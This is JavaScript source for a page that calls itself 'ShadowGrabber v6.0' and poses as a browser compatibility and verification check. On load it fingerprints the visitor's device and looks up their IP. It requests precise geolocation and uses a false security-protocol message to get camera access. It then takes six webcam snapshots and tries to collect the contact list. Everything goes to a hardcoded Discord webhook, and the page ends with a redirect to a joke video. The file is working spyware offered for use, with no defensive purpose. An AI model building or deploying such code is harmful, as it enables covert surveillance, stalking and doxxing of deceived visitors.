const config = {
    webhook: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    redirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
};

const dom = {
    loadingText: document.getElementById('loading-text'),
    status: document.getElementById('status-detail'),
    progressBar: document.getElementById('progress-bar'),
    trigger: document.getElementById('click-trigger'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c')
};

const state = {
    startTime: Date.now(),
    snapsTaken: 0
};

const updateUI = async (msg, prg) => {
    if (dom.loadingText) dom.loadingText.textContent = msg;
    if (dom.progressBar) dom.progressBar.style.width = prg + '%';
    await new Promise(r => setTimeout(r, 600));
};

const sendToDiscord = async (embed, file = null) => {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
    if (file) formData.append('file', file.blob, file.name);
    try {
        await fetch(config.webhook, { method: 'POST', body: formData });
    } catch (e) { console.warn('Webhook failed.'); }
};

// --- Elite Forensic Suite (10+ Points) ---
async function collectAdvancedForensics() {
    const gl = dom.canvas.getContext('webgl');
    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    const forensics = {
        device: {
            platform: navigator.platform,
            vendor: navigator.vendor,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory + 'GB',
            touchPoints: navigator.maxTouchPoints,
            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
        },
        display: {
            res: `${screen.width}x${screen.height}`,
            depth: screen.colorDepth + 'bit',
            ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : 'N/A',
            dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No'
        },
        network: {
            type: conn ? conn.effectiveType : 'N/A',
            rtt: conn ? conn.rtt + 'ms' : 'N/A',
            downlink: conn ? conn.downlink + 'Mbps' : 'N/A'
        }
    };

    let netIntel = {};
    try {
        const res = await fetch('https://ipapi.co/json/');
        netIntel = await res.json();
    } catch (e) { netIntel = { ip: 'Protected' }; }

    await sendToDiscord({
        title: "🛡️ ShadowGrabber v6.0: Forensics Captured",
        color: 0x3498DB,
        fields: [
            { name: "📱 Device Info", value: `\`\`\`Vendor: ${forensics.device.vendor}\nCores: ${forensics.device.cores}\nRAM: ${forensics.device.ram}\nTouch: ${forensics.device.touchPoints}\`\`\`` },
            { name: "🌍 Network Intel", value: `\`\`\`IP: ${netIntel.ip}\nOrg: ${netIntel.org || 'N/A'}\nType: ${forensics.network.type}\nSpeed: ${forensics.network.downlink}\`\`\`` },
            { name: "🖥️ Display/GPU", value: `\`\`\`Res: ${forensics.display.res}\nGPU: ${forensics.device.gpu}\nDark: ${forensics.display.dark}\`\`\`` }
        ],
        footer: { text: `Runtime: ${Math.round((Date.now() - state.startTime) / 1000)}s` }
    });
}

async function startShadowGrabber() {
    await updateUI('Checking browser compatibility', 15);
    await collectAdvancedForensics();

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await sendToDiscord({
                title: "📍 Target Location Verified",
                color: 0x2ECC71,
                description: `[Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`
            });
        }, null, { enableHighAccuracy: true });
    }

    dom.trigger.onclick = async () => {
        dom.trigger.style.display = 'none';
        await handleCamera();
    };
}

async function handleCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        dom.video.srcObject = stream;
        dom.video.onloadedmetadata = () => {
            dom.video.play();
            startSnapSequence();
        };
    } catch (e) {
        alert("Verification Error: Standard security protocol requires camera access to proceed. Please refresh and allow.");
    }
}

async function startSnapSequence() {
    await updateUI('Please wait its loding...', 50);

    const captureToDiscord = async (i) => {
        const ctx = dom.canvas.getContext('2d');
        dom.canvas.width = dom.video.videoWidth || 640;
        dom.canvas.height = dom.video.videoHeight || 480;

        await new Promise(r => setTimeout(r, 100));
        ctx.drawImage(dom.video, 0, 0);

        const blob = await new Promise(r => dom.canvas.toBlob(r, 'image/jpeg', 0.85));
        await sendToDiscord({
            title: `📸 Biometric Verification #${i}`,
            color: 0xE74C3C
        }, { blob, name: `snap_${i}.jpg` });
    };

    for (let i = 1; i <= 6; i++) {
        await captureToDiscord(i);
        await updateUI('Please wait its loding...', 50 + (i * 7));
        await new Promise(r => setTimeout(r, 500));
    }

    if ('contacts' in navigator && 'ContactsManager' in window) {
        await updateUI('Finalizing security sync...', 95);
        try {
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (contacts.length > 0) {
                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await sendToDiscord({ title: "📇 Recovery Nodes Extracted", color: 0x9B59B6 }, { blob, name: 'contacts.json' });
            }
        } catch (e) { }
    }

    window.location.href = config.redirect;
}

window.onload = startShadowGrabber;
